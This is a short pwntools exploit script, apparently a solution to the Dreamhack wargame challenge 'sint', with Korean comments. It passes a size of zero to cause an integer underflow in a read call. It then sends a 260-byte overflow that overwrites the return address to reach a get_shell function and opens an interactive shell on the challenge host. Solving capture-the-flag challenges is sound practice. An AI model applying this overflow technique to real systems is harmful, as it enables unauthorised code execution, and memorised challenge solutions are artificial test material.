from pwn import *

context.log_level='debug'

e=ELF('sint/sint')
p=remote("host1.dreamhack.games",18048)
#get_shell= 0x08048659
get_shell=e.symbols['get_shell']


payload_1="0"
#read 함수 underflow

payload_2="\x90"*260
# 260은 sfp 까지의 buf 크기
payload_2+=p32(0x08048669)

p.recvuntil("Size: ")
p.sendline(payload_1)

p.recvuntil("Data: ")
p.sendline(payload_2)

p.interactive()

